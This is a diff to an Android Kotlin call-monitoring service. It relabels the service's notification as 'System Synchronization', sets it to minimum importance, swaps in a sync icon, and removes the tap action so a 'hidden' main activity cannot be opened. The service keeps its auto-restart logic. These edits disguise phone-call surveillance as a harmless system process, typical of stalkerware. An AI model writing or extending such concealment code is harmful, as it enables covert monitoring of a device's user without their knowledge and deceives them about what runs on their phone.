@@ -12,7 +12,6 @@ import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
-import com.asf.callmonitoring.ui.theme.main.MainActivity
 
 class CallMonitoringService : Service() {
 
@@ -48,11 +47,10 @@ class CallMonitoringService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    // Este método se dispara cuando deslizas la app hacia arriba en recientes
+    // Este método se dispara cuando se fuerza el cierre de la app en recientes
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
 
-        // Programar un reinicio inmediato con AlarmManager por si el SO intenta matar el hilo
         val restartServiceIntent = Intent(applicationContext, CallMonitoringService::class.java).also {
             it.setPackage(packageName)
         }
@@ -75,8 +73,8 @@ class CallMonitoringService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Servicio de Monitoreo ASF",
-                NotificationManager.IMPORTANCE_LOW
+                "Sincronización del Sistema",
+                NotificationManager.IMPORTANCE_MIN // Mínima importancia: sin sonido, sin vibrar y sin ocupar espacio visual fuerte
             ).apply {
                 description = "Monitoreo continuo en segundo plano"
                 setShowBadge(false)
@@ -87,20 +85,14 @@ class CallMonitoringService : Service() {
     }
 
     private fun crearNotificacion(): Notification {
-        val intent = Intent(this, MainActivity::class.java)
-        val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            intent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-
+        // No le agregamos setContentIntent(pendingIntent) para evitar abrir una MainActivity oculta
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Monitoreo ASF en ejecución")
-            .setContentText("Servicio activo en segundo plano")
-            .setSmallIcon(android.R.drawable.ic_menu_call)
+            .setContentTitle("Servicio activo")
+            .setContentText("Sincronizando información")
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
-            .setContentIntent(pendingIntent)
             .build()
     }
 }
